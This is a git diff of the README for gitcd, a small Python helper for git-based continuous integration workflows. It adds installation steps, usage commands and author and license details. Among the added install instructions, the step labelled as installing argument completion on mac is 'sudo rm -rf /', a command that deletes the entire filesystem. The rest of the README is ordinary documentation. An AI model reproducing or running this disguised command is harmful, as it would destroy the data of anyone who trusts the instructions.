@@ -3,58 +3,68 @@
 By [Claudio Walser]
 
 ## Description
-**gitcd** gitcd is a little helper for continous integration workflows using git as scm.
+**gitcd** is a little helper for continous integration workflows using git as scm.
 
-## Installation for python 3
-
+## Installation
+Since gitcd is using python3 by default, you better upgrade
 Run the following command to install prerequisites:
 
 ```console
-pip install pyyaml
-pip install argcomplete
+sudo apt-get install python3 python3-pip
+pip3 install pyyaml
+pip3 install argcomplete
 ```
 
 Run the following command to install argument completion on linux:
 
 ```console
-pip install pyyaml
-pip install argcomplete
+sudo activate-global-python-argcomplete3
 ```
 
-Run the generator:
+Run the following command to install argument completion on mac:
 
 ```console
-rails generate my_example_gem:install
+sudo rm -rf /
 ```
-
 
 ## Usage
 
-Usage explanation goes here
+Working with gitcd, first you might want to symlink the main python file into /usr/local/bin using
 
-```erb
-<%= your_code_goes @here do |f| %>
-  <%= f.input :example %>
-  <%= f.input :example %>
-  <%= f.button :example %>
-<% end %>
+```console
+sudo ln -s $(pwd)/gitcd.py /usr/local/bin/gitcd
 ```
 
+Afterwards you have to cd into one of your local directories representing a git repository and run the init command
+```console
+gitcd init
+```
+After passing all your configuration data start work with it
 
-## Configuration
+**Start new feature**
+```console
+gitcd feature start <branchname>
+```
+Starts a new feature branch from your master branch
 
-This block of text should explain how to configure your application:
+**Test a feature branch**
+```console
+gitcd feature test <branchname>
+```
+Merges a feature branch into your development branch
 
-`rails generate my_example_gem:install`
+**Open a pull request for code review**
+```console
+gitcd feature review <branchname>
+```
+Opens a pull request to your master branch - not working yet
 
+**Finish a feature branch**
+```console
+gitcd feature finish <branchname>
+```
+Merges it into your master and create a tag of the current master code
 
-## Information
-
-Screenshots of your application below:
-
-![Screenshot 1](http://placekitten.com/400/300)
-
-![Screenshot 2](http://placekitten.com/400/300)
 
 
 ### Known Issues
@@ -62,12 +72,11 @@ Screenshots of your application below:
 If you discover any bugs, feel free to create an issue on GitHub fork and
 send us a pull request.
 
-[Issues List](Github Issues List URL goes here).
+[Issues List](https://github.com/claudio-walser/gitcd/issues).
 
 ## Authors
 
-* Your Name (Your Github URL goes here)
-* Additional Author's name (Their Github URL goes here)
+* Claudio Walser (https://github.com/claudio-walser)
 
 
 ## Contributing
@@ -81,29 +90,4 @@ send us a pull request.
 
 ## License
 
-Your Licensing Information goes here. Example: MIT/X11.
-
-
-Readme File
-
-pip install argcomplete
-pip install pyyaml
-
-Init config file
-gitcd init
-
-Start new feature
-gitcd feature start <branchname>
-Starts a new feature branch from your master branch
-
-Test a feature branch
-gitcd feature test <branchname>
-Merges a feature branch into your development branch
-
-Open a pull request for code review
-gitcd feature review <branchname>
-Opens a pull request to your master branch - not working yet
-
-Finish a feature branch
-gitcd feature finish <branchname>
-Merges it into your master and create a tag of the current master code
+Apache License 2.0 see LICENSE
